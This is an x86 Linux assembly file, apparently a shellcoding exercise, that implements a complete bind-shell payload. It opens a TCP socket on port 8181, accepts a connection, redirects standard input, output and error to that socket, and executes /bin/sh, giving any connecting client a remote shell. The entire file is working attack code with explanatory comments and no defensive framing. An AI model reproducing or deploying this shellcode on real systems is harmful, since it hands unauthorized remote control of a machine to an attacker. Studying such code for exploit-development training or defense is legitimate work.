global _start

section .text
_start:

	;syscall int socketcall(int call, unsigned long *args);
	xor eax, eax	;zeroing the eax register
	xor ebx, ebx 	;zeroing the ebx register
	xor ecx, ecx 	;zeroing the ecx register
	xor edi, edi
	mov  al, 0x66	;socketcall is 0x66
	
	;socket create
	mov  bl, 0x01	;int call=1 because we create socket
	;call socket int socket(int domain ,int type, int protocol)
	;pushing the values in reverse order

	push 0x06	;IPPROTO_TCP (int protocol=6)
	push 0x01	;SOCK_STREAM (int type=1)
	push 0x02	;AF_INER (int domain=2)
	mov ecx, esp 	;pointer on the starting point of parameters on the stack
	int 0x80	;invoking the syscall	
	mov edi, eax	;storing the sockfd

	;bind call int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;syscall int socketcall(int call, unsigned long *args);
        xor eax, eax    ;zeroing the eax register
        xor ebx, ebx    ;zeroing the ebx register
        xor ecx, ecx    ;zeroing the ecx register
        mov  al, 0x66   ;socketcall is 0x66
	mov  bl, 0x02	;int call=2 because we use the call bind

	;pushing the 8bytes zeros on the stack
        push ecx        ;4 bytes of Zero
        push ecx        ;4 bytes of Zero
        push ecx        ;4 bytes of Zero
        ;end of extra zeros and IP Address (IPADDR_ANY)
	;pushing the left values in reverse order
	push word 0xf51f 	;2 bytes (push of port 8181 1FF5 in reverse order little Endian format)
	push word 0x02	;Family (AF_INET)= 0x0002 (2 bytes)
	mov ecx, esp	;the parammeters of the bind to ecx
	
	push 0x10	;push the length of address 16 in decimal
	push ecx	;pointer to ecx
	push edi	;int sockfd (returned from  socket call and stored on edi)
	mov ecx, esp
	int 0x80	;invoking the syscall

	;listen
	;syscall int socketcall(int call, unsigned long *args);
        xor eax, eax    ;zeroing the eax register
        xor ebx, ebx    ;zeroing the ebx register
        xor ecx, ecx    ;zeroing the ecx register
        mov  al, 0x66   ;socketcall is 0x66
        mov  bl, 0x04	;int call=4  
	;int listen(int sockfd, int backlog);
        ;pushing in reverse order
	push 0x02	;pushing on stack the value for backlog
	push edi	;int sockfd (returned from  socket call and stored on edi)
	mov ecx, esp	;pointer for ecx
	int 0x80	;invoking the interrupt

	;accept
	;syscall int socketcall(int call, unsigned long *args);
        xor eax, eax    ;zeroing the eax register
        xor ecx, ecx    ;zeroing the ecx register
        mov  al, 0x66   ;socketcall is 0x66
        inc  bl   	;int call=5 , bl was 4 an now will be 5                          
        ;int listen(int sockfd, int backlog);
        ;pushing in reverse order
        push ecx   	
        push ecx        
        push edi	;pushing on stack the sockfd from the previous socket
	mov ecx, esp    ;pointer for ecx
        int 0x80        ;invoking the interrupt
	mov ebx, eax	;storing the socket descriptor that was created
			


	;int dup2(int oldfd, int newfd)
	xor eax, eax
	xor ecx, ecx
	mov cl, 0x02	;As a counter for 3 times

loop:
	mov al, 0x3f	;The system call dup2
	int 0x80
	dec ecx	
	jns loop	;Jump Not set. Jump if the sign flag (s) is NOT set
			;sign flag gets set when the result is negative -1


	;execve /bin//sh
	xor eax, eax
	push eax

	;push the /bin//sh

	push 0x68732f2f		;"hs//"
	push 0x6e69622f		;"nib/"

	mov ebx, esp	;pointer to the address of the /bin//sh
	push eax	;push zero in stack
	mov edx, esp	;store the zero in edx

	push ebx
	mov ecx, esp

	mov al, 0x0b
	int 0x80

